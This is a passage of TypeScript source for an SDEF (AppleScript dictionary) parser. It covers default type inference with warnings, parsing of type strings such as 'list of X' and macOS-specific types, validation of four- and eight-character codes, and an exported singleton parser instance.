        message: `Type inferred from name pattern "${elementName}": boolean`,
        location: {
          element: context || 'unknown',
          name: elementName,
          suite: this.currentSuite,
          command: this.currentCommand,
        },
        inferredValue: 'boolean',
      });

      return inferredType;
    }

    // PRIORITY 5: Context-aware defaults
    let defaultType: SDEFType;
    let defaultTypeStr: string;

    if (context === 'direct-parameter' || context === 'result') {
      defaultType = { kind: 'any' };
      defaultTypeStr = 'any';
    } else {
      defaultType = { kind: 'primitive', type: 'text' };
      defaultTypeStr = 'text';
    }

    // Emit additional warning for default fallback
    this.warn({
      code: 'TYPE_INFERRED_DEFAULT',
      message: `No specific type pattern matched, defaulting to "${defaultTypeStr}"`,
      location: {
        element: context || 'unknown',
        name: elementName,
        suite: this.currentSuite,
        command: this.currentCommand,
      },
      inferredValue: defaultTypeStr,
    });

    return defaultType;
  }

  /**
   * Parse type string into SDEFType
   *
   * Handles:
   * - Primitive types: text, integer, real, boolean
   * - File types: file, alias
   * - List types: "list of X"
   * - Record types: record
   * - Class references
   * - Enumeration references
   * - macOS-specific types: missing value, type, location specifier, color, date
   */
  private parseType(typeStr: string): SDEFType {
    // Safe to trim type strings - four-character codes only appear in 'code' attributes
    // Type attributes contain strings like "text", "list of file", etc.
    typeStr = typeStr.trim();

    // Handle primitive types
    if (typeStr === 'text' || typeStr === 'string') {
      return { kind: 'primitive', type: 'text' };
    }
    if (typeStr === 'integer' || typeStr === 'number') {
      return { kind: 'primitive', type: 'integer' };
    }
    if (typeStr === 'real' || typeStr === 'double') {
      return { kind: 'primitive', type: 'real' };
    }
    if (typeStr === 'boolean') {
      return { kind: 'primitive', type: 'boolean' };
    }

    // Handle file types
    if (typeStr === 'file' || typeStr === 'alias') {
      return { kind: 'file' };
    }

    // Handle macOS-specific types
    if (typeStr === 'any') {
      return { kind: 'any' };
    }
    if (typeStr === 'missing value') {
      return { kind: 'missing_value' };
    }
    if (typeStr === 'type') {
      return { kind: 'type_class' };
    }
    if (typeStr === 'location specifier' || typeStr === 'specifier') {
      return { kind: 'location_specifier' };
    }
    if (typeStr === 'color') {
      return { kind: 'color' };
    }
    if (typeStr === 'date') {
      return { kind: 'date' };
    }
    if (typeStr === 'property') {
      return { kind: 'property' };
    }
    if (typeStr === 'save options') {
      return { kind: 'save_options' };
    }

    // Handle list types: "list of X"
    const listMatch = typeStr.match(/^list(?:\s+of\s+(.+))?$/i);
    if (listMatch) {
      const itemTypeStr = listMatch[1];
      if (itemTypeStr) {
        return {
          kind: 'list',
          itemType: this.parseType(itemTypeStr),
        };
      }
      // Generic list without specified item type - default to text
      return {
        kind: 'list',
        itemType: { kind: 'primitive', type: 'text' },
      };
    }

    // Handle record types
    if (typeStr === 'record') {
      return {
        kind: 'record',
        properties: {}, // Properties would be defined elsewhere in SDEF
      };
    }

    // Check if it's an enumeration reference (common pattern: ends with 'enum' or starts with capital)
    // This is a heuristic - we'll treat any unknown type as potentially a class or enum reference
    // In a real implementation, we'd cross-reference with known classes/enums

    // Unknown type handling
    if (this.mode === 'strict') {
      throw new Error(`Unknown type: "${typeStr}"`);
    }

    // For now, assume unknown types are class references
    // A more sophisticated implementation would check against parsed classes/enums
    return {
      kind: 'class',
      className: typeStr,
    };
  }

  /**
   * Validate four-character code format
   *
   * Note: Commands use 8-character codes (two 4-char codes combined),
   * while other elements use 4-character codes
   */
  private validateFourCharCode(code: string, elementType: string, elementName: string): void {
    // Commands can have 8-character codes (e.g., "aevtodoc" = "aevt" + "odoc")
    // Other elements have 4-character codes
    const validLength = elementType === 'command' ? 8 : 4;

    if (code.length !== validLength) {
      throw new Error(
        `Invalid code "${code}" for ${elementType} "${elementName}": must be exactly ${validLength} characters`
      );
    }

    // Codes should be ASCII printable characters (no null bytes or control chars)
    for (let i = 0; i < code.length; i++) {
      const charCode = code.charCodeAt(i);
      if (charCode === 0 || charCode < 32 || charCode > 126) {
        throw new Error(
          `Invalid code "${code}" for ${elementType} "${elementName}": contains non-printable character`
        );
      }
    }
  }

  /**
   * Ensure value is an array (XML parser returns single item or array)
   */
  private ensureArray<T>(value: T | T[] | undefined): T[] {
    if (value === undefined || value === null) {
      return [];
    }
    return Array.isArray(value) ? value : [value];
  }

  /**
   * Clear the parse cache (useful for testing)
   */
  clearCache(): void {
    this.parseCache.clear();
  }
}

/**
 * Singleton instance for convenience
 */
export const sdefParser = new SDEFParser();
